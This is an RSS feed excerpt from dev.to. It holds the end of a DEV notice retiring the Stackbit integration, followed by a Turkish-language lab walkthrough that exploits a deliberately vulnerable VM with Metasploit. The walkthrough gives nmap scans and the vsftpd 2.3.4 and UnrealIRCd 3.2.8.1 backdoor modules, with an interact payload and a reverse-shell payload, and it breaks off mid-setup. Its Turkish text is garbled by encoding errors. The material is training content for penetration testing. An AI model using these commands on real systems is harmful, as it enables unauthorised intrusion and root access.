      <description>&lt;p&gt;Hey folks, this is a heads up that the special DEV/Stackbit integration &lt;a href="https://dev.to/settings/extensions"&gt;available in settings&lt;/a&gt; has stopped working and the reference to it will be removed shortly.&lt;/p&gt;

&lt;p&gt;A couple of years ago &lt;a href="https://dev.to/devteam/you-can-now-generate-self-hostable-static-blogs-right-from-your-dev-content-via-stackbit-7a5"&gt;we developed an integration that would allow folks to &lt;em&gt;automatically&lt;/em&gt; use DEV as a headless CMS for generating a Stackbit site&lt;/a&gt;. Making this possible in the first place was a big effort in data portability and trying to ensure DEV was not an all-consuming platform. We continue on this mission, but this specific very custom integration no longer fit the roadmap on either side. &lt;/p&gt;

&lt;p&gt;The specialized integration is going away, but there are &lt;em&gt;a lot&lt;/em&gt; of ways you can still hook up DEV to continue to act this way. For example, just a few weeks ago &lt;a class="mentioned-user" href="https://dev.to/vjnvisakh"&gt;@vjnvisakh&lt;/a&gt;
 posted this:&lt;/p&gt;


&lt;div class="ltag__link"&gt;
  &lt;a href="/vjnvisakh" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__pic"&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ZWskIlmd--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--_1S3ajsw--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/97730/b14b4ca5-6281-42a1-a6d6-173b480c35cd.png" alt="vjnvisakh"&gt;
    &lt;/div&gt;
  &lt;/a&gt;
  &lt;a href="/vjnvisakh/devto-as-a-headless-cms-efb" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__content"&gt;
      &lt;h2&gt;Dev.to as a headless CMS&lt;/h2&gt;
      &lt;h3&gt;Visakh Vijayan „Éª Nov 6 „Éª 2 min read&lt;/h3&gt;
      &lt;div class="ltag__link__taglist"&gt;
        &lt;span class="ltag__link__tag"&gt;#react&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#javascript&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#webdev&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#opensource&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
&lt;/div&gt;


&lt;p&gt;This was one of the few remaining bits of code that is super specialized for DEV. User-friendly integrations like this will return in a more generalized form in the future, in the meantime there are plenty of ways to use the API and existing tools to interact with DEV.&lt;/p&gt;

&lt;p&gt;You've probably noticed several deprecations lately. It's all in a larger effort to put more resources into the core functionality and make room for future extensibility. Of course, &lt;a href="https://github.com/forem/forem"&gt;everything we do is open source via Forem&lt;/a&gt; and free to use. We look forward to continued collaboration with the whole community.&lt;/p&gt;

</description>
      <category>meta</category>
      <category>stackbit</category>
    </item>
    <item>
      <title>Zafiyetli Makine √á√∂z√ºm√º</title>
      <author>Berkay-≈ûen</author>
      <pubDate>Tue, 07 Dec 2021 21:03:35 +0000</pubDate>
      <link>https://dev.to/yusiber/zafiyetli-makine-cozumu-i6</link>
      <guid>https://dev.to/yusiber/zafiyetli-makine-cozumu-i6</guid>
      <description>&lt;p&gt;Zaafiyetli makine √ß√∂z√ºm√ºm√ºze ba≈ülamadan √∂nce birka√ß kavramƒ± teorik olarak bilmemiz gerekiyor.√ñrnek olarak Exploit,payload gibi kavramlara hakim olalƒ±m ki sƒ±zma testi i≈üleminin mantƒ±ƒüƒ±nƒ± kavrayabilelim.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Exploit Nedir?&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Exploit bilgisayar, yazƒ±lƒ±m, programlarda veyahutta&lt;br&gt;
bir sistemde, sistem a√ßƒ±klarƒ±ndan ya da programcƒ±nƒ±n kod&lt;br&gt;
hatalarƒ±nƒ± kullanarak sisteme sƒ±zmaya veya sistemde istenmeyen hatalar olu≈üturmak i√ßin geli≈ütirilmi≈ü yazƒ±lƒ±mlar ve programlardƒ±r diyebiliriz.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Exploitler Neler Yapabilir&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Exploitler yetkimizin bulunmadƒ±ƒüƒ± bir sisteme izinsiz giri≈ü yapmabilme,verileri √ßalabilme,verileri g√∂r√ºnt√ºleme,bu verileri deƒüi≈ütirebilme, sistem √ºzerinde yetkili kullanƒ±cƒ±lar olu≈üturabilme ,sistemin i≈üleyi≈üini yava≈ülatabilme,i≈üleyi≈üi aksatabilme veyahutta devre dƒ±≈üƒ± bƒ±rakabilme gibi √∂zellikleri ger√ßekle≈ütirebilirler.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Zero-Day Exploit Nedir?&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Zero-Day exploitler hen√ºz daha a√ßƒ±ƒüƒ± kapatƒ±lmamƒ±≈ü,(yama yapƒ±lmamƒ±≈ü)&lt;br&gt;
exploitlerdir.Hackerlar geli≈ütirdikleri exploitlerin yayƒ±lmasƒ±nƒ± istemezler. √á√ºnk√º yayƒ±lƒ±rsa bu a√ßƒ±k kapanacaktƒ±r.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Exploit Veritabanlarƒ±&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://www.rapid7.com"&gt;https://www.rapid7.com&lt;/a&gt;&lt;br&gt;
&lt;a href="https://www.exploit-db.com"&gt;https://www.exploit-db.com&lt;/a&gt;&lt;br&gt;
Bu ve bunun gibi sitelerin i√ßerisinde bir √ßok exploit bulunmaktadƒ±r. Rapid7 Metasploit aracƒ±nƒ±n i√ßerisinde bulunan exploitlerin bulunduƒüu sitedir.Aynƒ± exploitleri Metasploit aracƒ±nda da bulabiliriz&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Payload Nedir ?&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hedef sisteme exploit doƒüru bir ≈üekilde uygulandƒ±ktan sonra hedefe yollanƒ±p √ßalƒ±≈ütƒ±rƒ±lamasƒ± istenen yazƒ±lƒ±ma/mod√ºle verilen addƒ±r. Bu mod√ºl sayesinde kar≈üƒ± tarafla baƒülantƒ±mƒ±z saƒülamƒ±≈ü olup kar≈üƒ± tarafa g√∂ndereceƒüimiz gereken komutlarƒ± bizden bekler/dinler ve mod√ºl sayesinde a√ßmƒ±≈ü olduƒüumuz servise g√∂nderir ve bu komutlarƒ±n kar≈üƒ± tarafta √ßalƒ±≈ümasƒ±nƒ± saƒülar.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Bind Payload Nedir?&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Bind payload t√ºr√ºnde hedefin a√ßƒ±k portundan i√ßeriye sƒ±zƒ±lƒ±p,bizim hedefe baƒülanmamƒ±zƒ± saƒülayan payloadlardƒ±r. Biz kar≈üƒ± sisteme baƒülandƒ±ƒüƒ±mƒ±z i√ßin olasƒ± antivir√ºsler ve firewall‚Äôlar yakalayabilir.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Reverse Payload Nedir?&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Reverse payload t√ºr√ºnde ise kar≈üƒ± hedef bizim cihazƒ±mƒ±za baƒülanarak sƒ±zma i≈ülemi ger√ßekle≈ütirilir. Kar≈üƒ± hedef bize baƒülandƒ±ƒüƒ± i√ßin firewall ve antiv√ºr√ºslere yakalanma olasƒ±ƒüƒ± d√º≈ü√ºkt√ºr.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#s%C4%B1zma-i%CC%87%C5%9Flemine-giri%C5%9F"&gt;
  &lt;/a&gt;
  Sƒ±zma ƒ∞≈ülemine Giri≈ü
&lt;/h2&gt;

&lt;p&gt;ƒ∞lk ba≈üta nmap aracƒ± ile aƒüƒ±mƒ±zdaki cihazlarƒ± tarayƒ±p listeleyerek sƒ±zacaƒüƒ±mƒ±z cihazƒ±n IP adresini bulalƒ±m.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;nmap 10.0.2.0/24 ‚ÄìT5
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;-T5 parametresi ile taramanƒ±n hƒ±zlƒ± olmasƒ±nƒ± saƒülƒ±yoruz.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--0VbaYM6I--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hb8ugv4y2u21j56640a0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--0VbaYM6I--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hb8ugv4y2u21j56640a0.png" alt="Image description" width="491" height="540"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;≈ûimdi bu IP √ºzerinden hedef sistemdeki portlarda √ßalƒ±≈üan servislerin versiyonlarƒ± hakkƒ±nda bilgi alalƒ±m.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;nmap ‚ÄìsV 10.0.2.4
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;-sV parametresi servislerin versiyonlarƒ±nƒ± getirir.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--EcbyWR7K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9ut3mhcp1ftgvvuop65r.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--EcbyWR7K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9ut3mhcp1ftgvvuop65r.png" alt="Image description" width="880" height="462"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Metasploit Nedir ? ( msfconsole )&lt;/strong&gt; &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Metasploit Framework, hem ofansif hem de defansif g√ºvenlikte kullanƒ±lan a√ßƒ±k kaynaklƒ± ve Ruby dili ile yazƒ±lmƒ±≈ü bir¬† platformdur. Metasploit Framework, sistemlerde bulunan a√ßƒ±klarƒ±n tespit edilmesi, s√∂m√ºr√ºlmesi ve sistemlere sƒ±zƒ±lmasƒ± i√ßin gerekli ara√ßlarƒ± i√ßinde barƒ±ndƒ±ran bir yapƒ±dƒ±r.¬†&lt;/p&gt;

&lt;p&gt;Metasploit Framework‚Äô√º Kali Linux i√ßerisinde hazƒ±r olarak gelmektedir.√áalƒ±≈ütƒ±rmak i√ßin ise &lt;code&gt;msfconsole&lt;/code&gt; Komutu kullanƒ±lmalƒ±dƒ±r.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qzQIiNvh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/411gegohgs8z4phlr8al.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qzQIiNvh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/411gegohgs8z4phlr8al.png" alt="Image description" width="722" height="324"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Metasploit √ºzerinde bir servisin exploitin bulunup bulunmadƒ±ƒüƒ±nƒ± anlamak i√ßin &lt;code&gt;search&lt;/code&gt; komutunu kullanƒ±rƒ±z.  &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--lmHE5iOA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ck9350ytcwkxsd1a5zgi.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--lmHE5iOA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ck9350ytcwkxsd1a5zgi.png" alt="Image description" width="880" height="232"&gt;&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;search vsftpd
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Komutunu kullanarak vsftpd servisinde bir exploitin bulunup bulunmadƒ±ƒüƒ±nƒ± aradƒ±k ver kar≈üƒ±mƒ±za bir adet exploit √ßƒ±ktƒ±.Bu exploiti kullanmak i√ßin bulduƒüumuz exploitin Name kƒ±smƒ±nƒ± kullanarak exploiti se√ßiyoruz.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;use exploit/unix/ftp/vsftpd_234_backdoor
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Y5qocDE0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/z0cljbyxknrbi2s6vk2h.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Y5qocDE0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/z0cljbyxknrbi2s6vk2h.png" alt="Image description" width="880" height="124"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Exploitimizi se√ßtik,≈üimdi de bu exploite uygun payloadlarƒ± listelememiz gerekiyor bunun i√ßin ≈üu komutu kullanƒ±yoruz.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;show payloads
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--90pAUsM6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k8b552jukvfpr0zx3cx1.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--90pAUsM6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k8b552jukvfpr0zx3cx1.png" alt="Image description" width="880" height="163"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Payloadlar listelendi.Aralarƒ±ndan birini se√ßmek i√ßin ise;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;set payload payload/cmd/unix/interact 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ufn3aFrF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ze0hbrxf84nocg13778y.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ufn3aFrF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ze0hbrxf84nocg13778y.png" alt="Image description" width="880" height="196"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Exploitimizi de payloadƒ±mƒ±zƒ± da se√ßtik. ≈ûimdi bu exploitin hangi sisteme IP'ye sƒ±zacaƒüƒ±nƒ± belirtmemiz gerek. Aksi takdirde exploit hangi sisteme sƒ±zma i≈ülemi yapacaƒüƒ±nƒ± normal olarak bilemeyecektir. Ayarlarƒ± g√∂stermek i√ßin ise;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;show options 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;komutunu kullanƒ±rƒ±z.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--6xV_qvBc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fh45ccmijhbxvuuigis1.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--6xV_qvBc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fh45ccmijhbxvuuigis1.png" alt="Image description" width="859" height="331"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Buradaki ayarlarƒ±n ne olduƒüunu a√ßƒ±klayacak olursak,&lt;br&gt;
RHOST Hedef cihazƒ±n IP‚Äôsi olmalƒ±,&lt;br&gt;
RPORT ise hedef cihazda hangi porttan sƒ±zma i≈ülemi yapacaksak o portun numarasƒ± olmalƒ±.&lt;br&gt;
Bu ayarlarƒ± deƒüi≈ütirmek i√ßin;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;set RHOST 10.0.2.4
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;set RPORT 21
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--7AxmEmJi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e27r454b7i3xj0vtdi4t.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7AxmEmJi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e27r454b7i3xj0vtdi4t.png" alt="Image description" width="846" height="190"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sƒ±zma i≈ülemini ba≈ülatmak i√ßin ise&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;run 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;ya da&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;exploit
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Komutlarƒ±nƒ± kullanƒ±rƒ±z.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--P0S78ODJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ikkn1mjx42jek4wxgb4o.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--P0S78ODJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ikkn1mjx42jek4wxgb4o.png" alt="Image description" width="868" height="197"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;G√∂r√ºld√ºƒü√º gibi bir shell baƒülantƒ±sƒ±nƒ±n a√ßƒ±ldƒ±ƒüƒ± yazƒ±yor ekranda. ≈ûuan kar≈üƒ± sisteme ba≈üarƒ±lƒ± bir ≈üekilde sƒ±zdƒ±ƒüƒ±mƒ±zƒ± s√∂yleyebilirim. ≈ûuan kar≈üƒ± sistemde bazƒ± komutlarƒ± kullanmayƒ± deneyebilirsiniz. √ñrnek olarak &lt;code&gt;ls&lt;/code&gt; , &lt;code&gt;whoami&lt;/code&gt; vb.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Cg18CUlH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5dqxmz2rc0sj5sxvqfnu.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Cg18CUlH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5dqxmz2rc0sj5sxvqfnu.png" alt="Image description" width="794" height="540"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hedef sistemde hangi kullanƒ±cƒ± ile giri≈ü yaptƒ±ƒüƒ±mƒ±zƒ± g√∂rmek i√ßin &lt;br&gt;
&lt;code&gt;whoami&lt;/code&gt; kullanalƒ±m.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_mG_KdM3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/htwbn000clu3w9h5wzvs.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_mG_KdM3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/htwbn000clu3w9h5wzvs.png" alt="Image description" width="880" height="103"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;G√∂rd√ºƒü√ºn√ºz gibi root kullanƒ±cƒ±yƒ±z.Ancak her zaman bu kadar ≈üanslƒ± olamayabiliriz. Yetkisi d√º≈ü√ºk bir kullanƒ±cƒ± ile giri≈ü yapmƒ±≈ü olabilirdir.O zaman da yetkimizi y√ºkseltmek i√ßin farklƒ± y√∂ntemlere ba≈üvuracaktƒ±k.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;≈ûimdi ise ba≈üka bir sƒ±zma testini reverse payload ile yapalƒ±m.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Bu sefer 6667. portta √ßalƒ±≈üan servisten sisteme sƒ±zacaƒüƒ±z.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--HfuanlXp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kllt4tv6624dw2butjew.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HfuanlXp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kllt4tv6624dw2butjew.png" alt="Image description" width="880" height="222"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Msfconsole √ºzerinden bu servisi aratalƒ±m.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Search UnrealIRCd
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--MlU6g142--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/m1tbpq0y1037but474la.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--MlU6g142--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/m1tbpq0y1037but474la.png" alt="Image description" width="880" height="189"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;G√∂rd√ºƒü√ºn√ºz gibi yine bu servis ile ilgili bir exploit bulundu. Hemen kullanƒ±mƒ±na ge√ßelim.&lt;/p&gt;

&lt;p&gt;Bulduƒüumuz exploiti se√ßelim.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;use exploit/unix/irc/unreal_ircd_3281_backdoor
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--YXe8TQ7l--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mfsdeokdl9pbvznys947.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--YXe8TQ7l--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mfsdeokdl9pbvznys947.png" alt="Image description" width="880" height="57"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Exploiti use komutu ile se√ßtikten sonra payloadlara g√∂z atalƒ±m.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;show payloads
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--PjUgxUPY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a0mxw9pj3m422otszpas.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--PjUgxUPY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a0mxw9pj3m422otszpas.png" alt="Image description" width="880" height="275"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Payladƒ±mƒ±zƒ± set komutu ile se√ßelim&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;set payload payload/cmd/unix/reverse
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Her payload √ßalƒ±≈ümayabilir,√ßalƒ±≈ümayan payload olursa ba≈üka bir payload denemeliyiz.Eƒüer sisteme sƒ±zamazsak bu exploit √ßalƒ±≈ümadƒ±ƒüƒ± anlamƒ±na gelmez.Payload'ƒ±mƒ±zda sorun olabilir,farklƒ± payloadlar denersek sorunu √ß√∂zebiliriz.&lt;/p&gt;

&lt;p&gt;Gerekli ayarlamalarƒ± yapalƒ±m.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;show options
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--EwDEjYt5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/01ilb23cg35ar89slz0t.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--EwDEjYt5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/01ilb23cg35ar89slz0t.png" alt="Image description" width="880" height="358"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bu sefer RHOST ve RPORT dƒ±≈üƒ±nda da farklƒ± ayarlar g√∂rd√ºk. Bunlar &lt;strong&gt;LHOST&lt;/strong&gt; ve &lt;strong&gt;LPORT&lt;/strong&gt; .Peki bu LHOST ve LPORT nedir. Ba≈üta anlattƒ±ƒüƒ±mƒ±z reverse payload'ƒ±n ayarlarƒ±dƒ±r. Reverse payloadƒ±n √ßalƒ±≈üma mantƒ±ƒüƒ± sƒ±zacaƒüƒ±mƒ±z sistem bize baƒülanƒ±yordu. Bu y√ºzden &lt;/p&gt;

&lt;p&gt;LHOST bizim IP adresimiz&lt;br&gt;
LPORT kar≈üƒ± baƒülantƒ±nƒ±n bizimle ileti≈üime ge√ßecek olan port numarasƒ±.&lt;/p&gt;

